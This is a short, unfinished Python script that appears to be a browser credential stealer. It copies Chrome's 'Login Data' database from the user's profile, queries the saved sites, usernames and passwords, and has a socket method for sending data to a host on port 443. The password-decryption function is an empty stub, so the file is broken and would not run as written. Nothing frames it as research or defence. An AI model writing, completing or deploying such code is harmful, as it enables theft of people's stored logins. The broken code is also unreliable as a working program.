import socket
import sqlite3
import shutil
from shutil import copyfile
import os


class sender:

    def send(self, message):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect(('127.0.0.1', 443))
            client_socket.sendall(message)


    def getChromeInfo(self, file):
        with sqlite3.connect(file) as connection:
            cursor = connection.cursor()
            res = cursor.execute('SELECT signon_realm, username_value, password_value FROM logins')
            return res.fetchall()


    def copyFile(self):
        path = '{}/AppData/Local/Google/Chrome/User Data/Default/Login Data'.format(os.path.expanduser('~'))
        shutil.copy(path, '{}s'.format(path))


    def decryptPass(self, bPassword):



sender = sender()
sender.getChromeInfo('C:/Users/gzx/Desktop/Login Data')